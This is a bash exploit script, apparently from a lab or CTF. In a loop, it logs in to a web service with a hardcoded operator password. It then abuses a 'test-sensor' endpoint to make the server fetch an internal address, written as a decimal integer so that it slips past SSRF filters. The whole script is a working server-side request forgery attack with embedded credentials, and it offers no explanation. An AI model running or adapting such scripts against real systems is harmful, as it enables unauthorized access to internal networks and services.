#!/bin/bash
BASE="http://169.58.126.107:6002"
dec=2887319554
for i in $(seq 1 "$1"); do
  jar=$(mktemp)
  /usr/bin/curl -s -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
  res=$(/usr/bin/curl -s -m 6 -b "$jar" -X POST "$BASE/ops/test-sensor" --data-urlencode "url=http://$dec:4000/status")
  echo "$(date +%T) #$i: $res"
  rm -f "$jar"
done
